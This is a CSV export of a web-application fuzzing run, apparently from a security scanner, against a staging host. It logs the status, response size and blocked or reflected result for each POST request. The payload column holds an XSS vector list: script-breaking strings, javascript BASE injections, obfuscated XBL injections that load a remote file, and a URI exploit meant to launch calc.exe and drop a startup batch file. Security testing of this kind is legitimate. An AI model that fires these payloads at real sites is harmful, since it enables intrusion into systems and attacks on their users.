Task ID,Message Type,Req. Timestamp,Method,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
23,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,165,579,121,426,5493,,Blocked,[Author Name: .mario]
25,Fuzzed,Tue Jun 02 18:22:56 CEST 2020,POST,https://staging.itapp.eus/,200,OK,186,579,136,426,5508,,Blocked,[Exploit Name: Advanced XSS Locator]
26,Fuzzed,Tue Jun 02 18:22:56 CEST 2020,POST,https://staging.itapp.eus/,200,OK,159,579,243,426,5490,,Blocked,"[Exploit String: ';alert(0)//\';alert(1)//"";alert(2)//\"";alert(3)//--></SCRIPT>"">'><SCRIPT>alert(4)</SCRIPT>=&{}"");}alert(6);function xss(){//]"
27,Fuzzed,Tue Jun 02 18:22:56 CEST 2020,POST,https://staging.itapp.eus/,200,OK,170,579,143,426,5515,,Blocked,[Exploit Description: Advanced XSS Locator]
28,Fuzzed,Tue Jun 02 18:22:56 CEST 2020,POST,https://staging.itapp.eus/,200,OK,167,579,169,426,5541,,Blocked,"[Exploit Tags: general, html breaking, comment breaking, JS breaking]"
29,Fuzzed,Tue Jun 02 18:22:56 CEST 2020,POST,https://staging.itapp.eus/,200,OK,164,579,121,426,5493,,Blocked,[Author Name: .mario]
30,Fuzzed,Tue Jun 02 18:22:56 CEST 2020,POST,https://staging.itapp.eus/,200,OK,196,579,143,426,5515,,Blocked,[Advanced XSS Locator for title-Injections]
31,Fuzzed,Tue Jun 02 18:22:57 CEST 2020,POST,https://staging.itapp.eus/,200,OK,152,579,157,426,5529,,Blocked,[Exploit Name: Advanced XSS Locator for title-Injections]
32,Fuzzed,Tue Jun 02 18:22:57 CEST 2020,POST,https://staging.itapp.eus/,200,OK,169,579,258,426,5490,,Blocked,"[Exploit String: ';alert(0)//\';alert(1)//"";alert(2)//\"";alert(3)//--></SCRIPT>"">'></title><SCRIPT>alert(4)</SCRIPT>=&{</title><script>alert(5)</script>}"");}]"
33,Fuzzed,Tue Jun 02 18:22:57 CEST 2020,POST,https://staging.itapp.eus/,200,OK,157,579,236,426,5608,,Blocked,[Exploit Description: This is a modified version of the XSS Locator from ha.ckers.org especially crafted to check for title injections.]
34,Fuzzed,Tue Jun 02 18:22:57 CEST 2020,POST,https://staging.itapp.eus/,200,OK,174,579,185,426,5557,,Blocked,"[Exploit Tags: general, html breaking, comment breaking, JS breaking, title breaking]"
35,Fuzzed,Tue Jun 02 18:22:57 CEST 2020,POST,https://staging.itapp.eus/,200,OK,191,579,121,426,5493,,Blocked,[Author Name: .mario]
36,Fuzzed,Tue Jun 02 18:22:57 CEST 2020,POST,https://staging.itapp.eus/,200,OK,146,579,118,426,5490,,Reflected,[aim: uri exploit]
37,Fuzzed,Tue Jun 02 18:22:58 CEST 2020,POST,https://staging.itapp.eus/,200,OK,373,579,132,426,5504,,Blocked,[Exploit Name: aim: uri exploit]
38,Fuzzed,Tue Jun 02 18:22:58 CEST 2020,POST,https://staging.itapp.eus/,200,OK,156,579,232,426,5495,,Blocked,"[Exploit String: aim: &c:\windows\system32\calc.exe"" ini=""C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat""]"
39,Fuzzed,Tue Jun 02 18:22:58 CEST 2020,POST,https://staging.itapp.eus/,200,OK,159,579,179,426,5551,,Blocked,[Exploit Description: This aim-uri executes the calc.exe on vulnerable systems]
24,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,500,Internal Server Error,3019,579,122,265,182785,,Reflected,[Advanced XSS Locator]
40,Fuzzed,Tue Jun 02 18:22:58 CEST 2020,POST,https://staging.itapp.eus/,200,OK,250,579,155,426,5527,,Blocked,"[Exploit Tags: URI exploits, gecko, injection, general]"
41,Fuzzed,Tue Jun 02 18:22:58 CEST 2020,POST,https://staging.itapp.eus/,200,OK,188,579,124,426,5496,,Blocked,[Author Name: xs-sniper]
42,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,227,579,148,426,5520,,Blocked,[Backslash-obfuscated XBL injection - variant 1]
43,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,191,579,162,426,5534,,Blocked,[Exploit Name: Backslash-obfuscated XBL injection - variant 1]
44,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,163,579,205,426,5597,,Blocked,[Exploit String: <div/style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>]
45,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,191,579,232,426,5604,,Blocked,[Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL.]
46,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,151,579,175,426,5547,,Blocked,"[Exploit Tags: general, injection, gecko, style injection, XBL, obfuscated]"
47,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,157,579,131,426,5503,,Blocked,[Author Name: thespanner.co.uk]
48,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,153,579,148,426,5520,,Blocked,[Backslash-obfuscated XBL injection - variant 2]
49,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,177,579,162,426,5534,,Blocked,[Exploit Name: Backslash-obfuscated XBL injection - variant 2]
50,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,165,579,169,426,5504,,Blocked,[Exploit String: <div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&]
51,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,220,579,150,426,5465,,Blocked,[&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92]
52,Fuzzed,Tue Jun 02 18:22:59 CEST 2020,POST,https://staging.itapp.eus/,200,OK,195,579,150,426,5465,,Blocked,[&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>]
54,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,168,579,175,426,5547,,Blocked,"[Exploit Tags: general, injection, gecko, style injection, XBL, obfuscated]"
53,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,196,579,294,426,5666,,Blocked,[Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. All important characters are obfuscated by unclosed entities.]
56,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,164,579,148,426,5520,,Blocked,[Backslash-obfuscated XBL injection - variant 3]
55,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,172,579,131,426,5520,,Blocked,[Author Name: thespanner.co.uk]
58,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,148,579,213,426,5497,,Blocked,[Exploit String: <Q%^&*(£@!’” style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>]
57,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,154,579,162,426,5534,,Blocked,[Exploit Name: Backslash-obfuscated XBL injection - variant 3]
59,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,163,579,308,426,5547,,Blocked,[Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. As we can see gecko based browsers accept various characters as valid tags.]
60,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,167,579,175,426,5547,,Blocked,"[Exploit Tags: general, injection, gecko, style injection, XBL, obfuscated]"
61,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,162,579,131,426,5503,,Blocked,[Author Name: thespanner.co.uk]
62,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,160,579,148,426,5520,,Blocked,[Backslash-obfuscated XBL injection - variant 4]
63,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,162,579,162,426,5497,,Blocked,[Exploit Name: Backslash-obfuscated XBL injection - variant 4]
64,Fuzzed,Tue Jun 02 18:23:00 CEST 2020,POST,https://staging.itapp.eus/,200,OK,168,579,216,426,5497,,Blocked,[Exploit String: <div&nbsp &nbsp style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>]
65,Fuzzed,Tue Jun 02 18:23:01 CEST 2020,POST,https://staging.itapp.eus/,200,OK,203,579,301,426,5673,,Blocked,[Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. Furthermore unclosed NBSP entities are used to obfuscate the string.]
66,Fuzzed,Tue Jun 02 18:23:01 CEST 2020,POST,https://staging.itapp.eus/,200,OK,226,579,175,426,5547,,Blocked,"[Exploit Tags: general, injection, gecko, style injection, XBL, obfuscated]"
67,Fuzzed,Tue Jun 02 18:23:01 CEST 2020,POST,https://staging.itapp.eus/,200,OK,152,579,131,426,5503,,Blocked,[Author Name: thespanner.co.uk]
68,Fuzzed,Tue Jun 02 18:23:01 CEST 2020,POST,https://staging.itapp.eus/,200,OK,153,579,148,426,5520,,Blocked,[Backslash-obfuscated XBL injection - variant 5]
69,Fuzzed,Tue Jun 02 18:23:01 CEST 2020,POST,https://staging.itapp.eus/,200,OK,167,579,162,426,5534,,Blocked,[Exploit Name: Backslash-obfuscated XBL injection - variant 5]
70,Fuzzed,Tue Jun 02 18:23:01 CEST 2020,POST,https://staging.itapp.eus/,200,OK,146,579,287,426,5715,,Blocked,[Exploit String: <x/style=-m\0o\0z\0-b\0i\0nd\0i\0n\0g\0:\0u\0r\0l\0(\0/\0/b\0u\0s\0i\0ne\0s\0s\0i\0nf\0o\0.c\0o\0.\0u\0k\0/\0la\0b\0s\0/\0x\0b\0l\0/\0x\0b\0l\0.\0x\0m\0l\0#\0x\0s\0s\0)>]
71,Fuzzed,Tue Jun 02 18:23:01 CEST 2020,POST,https://staging.itapp.eus/,200,OK,173,579,312,426,5547,,Blocked,[Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. Between any character of the original payload null bytes are used to obfuscate.]
72,Fuzzed,Tue Jun 02 18:23:01 CEST 2020,POST,https://staging.itapp.eus/,200,OK,162,579,175,426,5547,,Blocked,"[Exploit Tags: general, injection, gecko, style injection, XBL, obfuscated]"
73,Fuzzed,Tue Jun 02 18:23:01 CEST 2020,POST,https://staging.itapp.eus/,200,OK,167,579,131,426,5503,,Blocked,[Author Name: thespanner.co.uk]
75,Fuzzed,Tue Jun 02 18:23:01 CEST 2020,POST,https://staging.itapp.eus/,200,OK,166,579,120,426,5492,,Blocked,[Exploit Name: BASE]
76,Fuzzed,Tue Jun 02 18:23:02 CEST 2020,POST,https://staging.itapp.eus/,200,OK,159,579,158,426,5527,,Blocked,"[Exploit String: <BASE HREF=""javascript:alert('XSS');//"">]"
77,Fuzzed,Tue Jun 02 18:23:02 CEST 2020,POST,https://staging.itapp.eus/,200,OK,216,579,585,426,5956,,Blocked,"[Exploit Description: Works in IE and Netscape 8.1 in safe mode.  You need the // to comment out the next characters so you won't get a JavaScript error and your XSS tag will render.  Also, this relies on the fact that the website uses dynamically placed images like ”images/image.jpg” rather than full paths.  If the path includes a leading forward slash like ”/images/image.jpg” you can remove one slash from this vector (as long as there are two to begin the comment this will work]"
78,Fuzzed,Tue Jun 02 18:23:02 CEST 2020,POST,https://staging.itapp.eus/,200,OK,160,579,134,426,5506,,Blocked,"[Exploit Tags: general, evil tags]"
79,Fuzzed,Tue Jun 02 18:23:02 CEST 2020,POST,https://staging.itapp.eus/,200,OK,180,579,127,426,5499,,Blocked,[Author Name: ha.ckers.org]
12,Fuzzed,Tue Jun 02 18:23:15 CEST 2020,POST,https://staging.itapp.eus/,500,Internal Server Error,6954,579,126,265,230792,,Reflected,[Add onclick event hadler]
81,Fuzzed,Tue Jun 02 18:23:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,236,579,151,426,5523,,Blocked,[Exploit Name: Basic back ticked attribute breaker]
82,Fuzzed,Tue Jun 02 18:23:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,256,579,146,426,5533,,Blocked,[Exploit String: `> <script>alert(5)</script>]
83,Fuzzed,Tue Jun 02 18:23:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,264,579,165,426,5537,,Blocked,[Exploit Description: This vector breaks back ticked attributes.]
84,Fuzzed,Tue Jun 02 18:23:22 CEST 2020,POST,https://staging.itapp.eus/,200,OK,213,579,145,426,5517,,Blocked,"[Exploit Tags: general, html breaking, basic]"
85,Fuzzed,Tue Jun 02 18:23:23 CEST 2020,POST,https://staging.itapp.eus/,200,OK,284,579,121,426,5493,,Blocked,[Author Name: kishor]
89,Fuzzed,Tue Jun 02 18:24:01 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,436,579,189,172,332,,,[Exploit Description: This vector breaks double quoted attributes and produces an alert.]
86,Fuzzed,Tue Jun 02 18:23:43 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,19025,579,139,172,332,,,[Basic double quoted attribute breaker]
88,Fuzzed,Tue Jun 02 18:23:55 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,6868,579,145,172,332,,,[Exploit String: > <script>alert(4)</script>]
87,Fuzzed,Tue Jun 02 18:23:55 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,7292,579,153,172,332,,,[Exploit Name: Basic double quoted attribute breaker]
80,Fuzzed,Tue Jun 02 18:23:42 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,19459,579,137,172,332,,,[Basic back ticked attribute breaker]
91,Fuzzed,Tue Jun 02 18:24:02 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9124,579,121,172,332,,,[Author Name: kishor]
90,Fuzzed,Tue Jun 02 18:24:02 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9125,579,138,172,332,,,"[Exploit Tags: general, html breaking]"
92,Fuzzed,Tue Jun 02 18:24:02 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9125,579,118,172,332,,,[Basic JS breaker]
93,Fuzzed,Tue Jun 02 18:24:02 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9126,579,132,172,332,,,[Exploit Name: Basic JS breaker]
94,Fuzzed,Tue Jun 02 18:24:02 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9123,579,139,172,332,,,[Exploit String: xyz onerror=alert(6);]
97,Fuzzed,Tue Jun 02 18:24:11 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9121,579,121,172,332,,,[Author Name: kishor]
95,Fuzzed,Tue Jun 02 18:24:11 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9123,579,185,172,332,,,[Exploit Description: This vector just fits between script tags and fires an alerts.]
96,Fuzzed,Tue Jun 02 18:24:11 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9122,579,143,172,332,,,"[Exploit Tags: general, JS breaking, basic]"
98,Fuzzed,Tue Jun 02 18:24:11 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9126,579,128,172,332,,,[Basic JS breaker variant 1]
99,Fuzzed,Tue Jun 02 18:24:11 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9125,579,142,172,332,,,[Exploit Name: Basic JS breaker variant 1]
102,Fuzzed,Tue Jun 02 18:24:20 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9123,579,155,172,332,,,"[Exploit Tags: general, JS breaking, basic, obfuscated]"
101,Fuzzed,Tue Jun 02 18:24:20 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9123,579,165,172,332,,,[Exploit Description: This vector breaks JS integer assignments.]
100,Fuzzed,Tue Jun 02 18:24:20 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9128,579,152,172,332,,,[Exploit String: 1;a=eval;b=alert;a(b(/c/.source));]
104,Fuzzed,Tue Jun 02 18:24:20 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9123,579,128,172,332,,,[Basic JS breaker variant 2]
103,Fuzzed,Tue Jun 02 18:24:20 CEST 2020,POST,https://staging.itapp.eus/,502,Bad Gateway,9127,579,121,172,332,,,[Author Name: kishor]
109,Fuzzed,Tue Jun 02 18:24:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,3662,579,121,426,5493,,Blocked,[Author Name: kishor]
108,Fuzzed,Tue Jun 02 18:24:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,3667,579,155,426,5527,,Blocked,"[Exploit Tags: general, JS breaking, basic, obfuscated]"
107,Fuzzed,Tue Jun 02 18:24:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,3668,579,175,426,5547,,Blocked,[Exploit Description: This vector breaks JS integer assignments in arrays.]
106,Fuzzed,Tue Jun 02 18:24:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,3674,579,147,426,5547,,Blocked,[Exploit String: 1];a=eval;b=alert;a(b(17));//]
113,Fuzzed,Tue Jun 02 18:24:33 CEST 2020,POST,https://staging.itapp.eus/,200,OK,220,579,181,426,5553,,Blocked,[Exploit Description: This vector breaks JS when placed in double quoted arrays.]
105,Fuzzed,Tue Jun 02 18:24:29 CEST 2020,POST,https://staging.itapp.eus/,200,OK,3898,579,142,426,5514,,Blocked,[Exploit Name: Basic JS breaker variant 2]
112,Fuzzed,Tue Jun 02 18:24:33 CEST 2020,POST,https://staging.itapp.eus/,200,OK,227,579,146,426,5491,,Blocked,[Exploit String: ];a=eval;b=alert;a(b(16));//]
114,Fuzzed,Tue Jun 02 18:24:33 CEST 2020,POST,https://staging.itapp.eus/,200,OK,246,579,136,426,5508,,Blocked,"[Exploit Tags: general, JS breaking]"
115,Fuzzed,Tue Jun 02 18:24:33 CEST 2020,POST,https://staging.itapp.eus/,200,OK,245,579,121,426,5493,,Blocked,[Author Name: kishor]
118,Fuzzed,Tue Jun 02 18:24:33 CEST 2020,POST,https://staging.itapp.eus/,200,OK,133,579,147,426,5491,,Blocked,[Exploit String: '];a=eval;b=alert;a(b(15));//]
117,Fuzzed,Tue Jun 02 18:24:33 CEST 2020,POST,https://staging.itapp.eus/,200,OK,144,579,142,426,5514,,Blocked,[Exploit Name: Basic JS breaker variant 4]
120,Fuzzed,Tue Jun 02 18:24:34 CEST 2020,POST,https://staging.itapp.eus/,200,OK,133,579,155,426,5527,,Blocked,"[Exploit Tags: general, JS breaking, basic, obfuscated]"
119,Fuzzed,Tue Jun 02 18:24:34 CEST 2020,POST,https://staging.itapp.eus/,200,OK,139,579,183,426,5555,,Blocked,[Exploit Description: This vector breaks JS when embedded in single quoted arrays.]
121,Fuzzed,Tue Jun 02 18:24:34 CEST 2020,POST,https://staging.itapp.eus/,200,OK,146,579,121,426,5493,,Blocked,[Author Name: kishor]
123,Fuzzed,Tue Jun 02 18:24:34 CEST 2020,POST,https://staging.itapp.eus/,200,OK,148,579,142,426,5514,,Blocked,[Exploit Name: Basic JS breaker variant 5]
124,Fuzzed,Tue Jun 02 18:24:34 CEST 2020,POST,https://staging.itapp.eus/,200,OK,134,579,147,426,5492,,Blocked,[Exploit String: 1};a=eval;b=alert;a(b(14));//]
125,Fuzzed,Tue Jun 02 18:24:34 CEST 2020,POST,https://staging.itapp.eus/,200,OK,144,579,172,426,5544,,Blocked,[Exploit Description: JS literal object breaker for integer properties.]
126,Fuzzed,Tue Jun 02 18:24:34 CEST 2020,POST,https://staging.itapp.eus/,200,OK,159,579,155,426,5527,,Blocked,"[Exploit Tags: general, JS breaking, basic, obfuscated]"
127,Fuzzed,Tue Jun 02 18:24:34 CEST 2020,POST,https://staging.itapp.eus/,200,OK,167,579,121,426,5493,,Blocked,[Author Name: kishor]
122,Fuzzed,Tue Jun 02 18:24:34 CEST 2020,POST,https://staging.itapp.eus/,500,Internal Server Error,2212,579,128,265,228075,,Reflected,[Basic JS breaker variant 5]
116,Fuzzed,Tue Jun 02 18:24:33 CEST 2020,POST,https://staging.itapp.eus/,500,Internal Server Error,2733,579,128,265,228075,,Reflected,[Basic JS breaker variant 4]
110,Fuzzed,Tue Jun 02 18:24:33 CEST 2020,POST,https://staging.itapp.eus/,500,Internal Server Error,2973,579,128,265,228075,,Reflected,[Basic JS breaker variant 3]
129,Fuzzed,Tue Jun 02 18:24:36 CEST 2020,POST,https://staging.itapp.eus/,200,OK,147,579,142,426,5514,,Blocked,[Exploit Name: Basic JS breaker variant 6]
130,Fuzzed,Tue Jun 02 18:24:36 CEST 2020,POST,https://staging.itapp.eus/,200,OK,155,579,147,426,5491,,Blocked,[Exploit String: '};a=eval;b=alert;a(b(13));//]
131,Fuzzed,Tue Jun 02 18:24:36 CEST 2020,POST,https://staging.itapp.eus/,200,OK,178,579,191,426,5563,,Blocked,[Exploit Description: JS breaker for literal objects with single quoted string properties.]
132,Fuzzed,Tue Jun 02 18:24:36 CEST 2020,POST,https://staging.itapp.eus/,200,OK,149,579,155,426,5493,,Blocked,"[Exploit Tags: general, JS breaking, basic, obfuscated]"
133,Fuzzed,Tue Jun 02 18:24:36 CEST 2020,POST,https://staging.itapp.eus/,200,OK,153,579,121,426,5493,,Blocked,[Author Name: kishor]
136,Fuzzed,Tue Jun 02 18:24:36 CEST 2020,POST,https://staging.itapp.eus/,200,OK,142,579,146,426,5491,,Blocked,[Exploit String: };a=eval;b=alert;a(b(12));//]
135,Fuzzed,Tue Jun 02 18:24:36 CEST 2020,POST,https://staging.itapp.eus/,200,OK,189,579,142,426,5514,,Blocked,[Exploit Name: Basic JS breaker variant 7]
137,Fuzzed,Tue Jun 02 18:24:36 CEST 2020,POST,https://staging.itapp.eus/,200,OK,247,579,191,426,5563,,Blocked,[Exploit Description: JS breaker for literal objects with double quoted string properties.]
138,Fuzzed,Tue Jun 02 18:24:36 CEST 2020,POST,https://staging.itapp.eus/,200,OK,232,579,136,426,5508,,Blocked,"[Exploit Tags: general, JS breaking]"
139,Fuzzed,Tue Jun 02 18:24:37 CEST 2020,POST,https://staging.itapp.eus/,200,OK,149,579,121,426,5493,,Blocked,[Author Name: kishor]
141,Fuzzed,Tue Jun 02 18:24:37 CEST 2020,POST,https://staging.itapp.eus/,200,OK,177,579,142,426,5514,,Blocked,[Exploit Name: Basic JS breaker variant 8]
142,Fuzzed,Tue Jun 02 18:24:37 CEST 2020,POST,https://staging.itapp.eus/,200,OK,177,579,148,426,5493,,Blocked,[Exploit String: a=1;a=eval;b=alert;a(b(11));//]
143,Fuzzed,Tue Jun 02 18:24:37 CEST 2020,POST,https://staging.itapp.eus/,200,OK,331,579,168,426,5540,,Blocked,[Exploit Description: Can be used when JS can be injected directly.]
144,Fuzzed,Tue Jun 02 18:24:37 CEST 2020,POST,https://staging.itapp.eus/,200,OK,218,579,155,426,5527,,Blocked,"[Exploit Tags: general, JS breaking, basic, obfuscated]"
